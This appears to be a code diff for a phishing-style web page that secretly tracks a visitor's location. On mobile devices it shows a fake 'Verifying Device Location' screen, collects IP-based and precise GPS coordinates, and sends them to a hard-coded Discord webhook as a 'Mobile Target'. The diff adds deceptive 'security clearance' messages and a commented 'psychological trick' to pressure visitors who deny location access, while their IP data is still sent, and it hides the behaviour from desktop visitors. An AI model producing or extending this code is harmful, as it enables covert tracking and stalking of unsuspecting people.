@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System</title>
+    <title>System Secure</title>
     <style>
         body {
             background-color: #000000;
@@ -15,115 +15,133 @@
             justify-content: center;
             align-items: center;
             font-family: monospace;
+            color: #00ff41;
         }
-        #error-message {
+        #loading-screen {
+            text-align: center;
+            display: none;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 255, 65, 0.1);
+            border-top: 4px solid #00ff41;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #error-msg {
             color: #ff3333;
             text-align: center;
             font-size: 1.2rem;
-            display: none; /* Hidden by default */
+            display: none;
             padding: 20px;
             border: 1px solid #ff3333;
             border-radius: 8px;
             background: #110000;
+            max-width: 80%;
         }
     </style>
 </head>
 <body>
 
-<div id="error-message">
+<!-- Shows on PC -->
+<div id="error-msg">
     <strong>Device Not Supported</strong><br><br>
-    Please try on a mobile device.
+    Please open this link on your mobile device.
+</div>
+
+<!-- Shows on Mobile while waiting for GPS -->
+<div id="loading-screen">
+    <div class="spinner"></div>
+    <h2>Verifying Device Location...</h2>
+    <p style="color: #888; font-size: 0.8rem; margin-top: 20px;">Please click <b>"Allow"</b> when prompted to continue.</p>
 </div>
 
 <script>
     // ⚠️ YOUR DISCORD WEBHOOK URL ⚠️
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561439920571289760/bibhypIWcysN4R9oPLF2i6NBwU_Vj-BZ_uXigEYYwKAQWto3_cb21aocNKeE4cSb742y';
 
-    // 1. Detect if the device is a PC (Desktop/Laptop)
     function isPC() {
         const ua = navigator.userAgent;
-        
-        // Check for common mobile keywords in the User Agent
         const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
-        
-        // Check if the device has a touch screen (Phones/Tablets have this, most laptops don't)
-        const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-        
-        // Check screen size (PC screens are usually wider than 1024px)
         const isLargeScreen = window.innerWidth > 1024;
-
-        // If it's NOT a mobile browser, and it has a large screen -> It's a PC
-        if (!isMobile && isLargeScreen) {
-            return true;
-        }
-        
+        if (!isMobile && isLargeScreen) return true;
         return false;
     }
 
-    // 2. Logic Handler
     if (isPC()) {
-        // If it's a PC, show the error and DO NOT execute the payload
-        document.getElementById('error-message').style.display = 'block';
-        console.log("PC detected. Payload blocked.");
+        document.getElementById('error-msg').style.display = 'block';
     } else {
-        // If it's a Mobile device, keep it black and run the payload
-        console.log("Mobile device detected. Running payload...");
+        // Show the fake loading screen on Mobile
+        document.getElementById('loading-screen').style.display = 'block';
+        
+        // Start the payload
         executePayload();
     }
 
-    // 3. The Exfiltration Payload
     async function executePayload() {
         let ipData = {};
-        let gpsData = { status: "Not requested" };
-
         try {
-            // Fetch IP & Approximate Location
             const ipRes = await fetch('https://freeipapi.com/api/json');
             ipData = await ipRes.json();
         } catch (e) {
             ipData = { error: 'IP Fetch Failed' };
         }
 
-        try {
-            // Request Exact GPS
-            if (navigator.geolocation) {
-                gpsData = await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => resolve({
-                            status: "SUCCESS (Exact GPS Received)",
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            acc: pos.coords.accuracy
-                        }),
-                        (err) => {
-                            let reason = "Unknown";
-                            if (err.code === 1) reason = "Permission Denied";
-                            if (err.code === 2) reason = "Position Unavailable";
-                            if (err.code === 3) reason = "Timeout";
-                            resolve({ status: "FAILED", reason: reason, errorCode: err.code });
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                });
-            }
-        } catch (e) {
-            gpsData = { status: 'ERROR', reason: e.toString() };
+        let gpsData = await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({
+                    status: "SUCCESS",
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    acc: pos.coords.accuracy
+                }),
+                (err) => resolve({ status: "FAILED", reason: err.message }),
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        });
+
+        // --- THE PSYCHOLOGICAL TRICK ---
+        if (gpsData.status === "FAILED") {
+            // If they clicked "Block", force them to refresh
+            const loadingScreen = document.getElementById('loading-screen');
+            loadingScreen.innerHTML = `
+                <div id="error-msg" style="display:block;">
+                    <strong>Location Access Denied</strong><br><br>
+                    This portal requires your location to verify your security clearance. Please refresh the page and click "Allow".
+                </div>
+            `;
+            // Still send the IP data to Discord in the background
+            sendToDiscord(ipData, gpsData);
+            return; 
         }
 
-        // Build the Exfil Payload
-        let gpsString = "";
-        if (gpsData.status.includes("SUCCESS")) {
-            gpsString = `✅ **Status:** ${gpsData.status}\n**Latitude:** \`${gpsData.lat}\`\n**Longitude:** \`${gpsData.lon}\`\n**Accuracy:** ${gpsData.acc} meters`;
-        } else {
-            gpsString = `❌ **Status:** ${gpsData.status}\n**Reason:** ${gpsData.reason}`;
-        }
+        // If they clicked "Allow", show "Verified" and send to Discord
+        const loadingScreen = document.getElementById('loading-screen');
+        loadingScreen.innerHTML = `
+            <h2 style="color:#00ff41;">✓ Access Granted</h2>
+            <p style="color: #888;">Redirecting...</p>
+        `;
+        
+        await sendToDiscord(ipData, gpsData);
+    }
+
+    async function sendToDiscord(ipData, gpsData) {
+        let gpsString = gpsData.lat 
+            ? `✅ **Status:** SUCCESS\n**Latitude:** \`${gpsData.lat}\`\n**Longitude:** \`${gpsData.lon}\`\n**Accuracy:** ${gpsData.acc} meters`
+            : `❌ **Status:** FAILED\n**Reason:** ${gpsData.reason}`;
 
         const mapLink = gpsData.lat 
             ? `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon}` 
             : (ipData.latitude ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : 'N/A');
 
         const payload = {
-            content: `🚨 **Mobile Target Visited the Page** 🚨`,
+            content: `🚨 **Mobile Target Detected** 🚨`,
             embeds: [
                 {
                     title: "Personal Information Captured",
@@ -143,16 +161,11 @@
             ]
         };
 
-        // Send to Discord
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (e) {
-            console.error("Discord webhook failed:", e);
-        }
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
     }
 </script>
 </body>
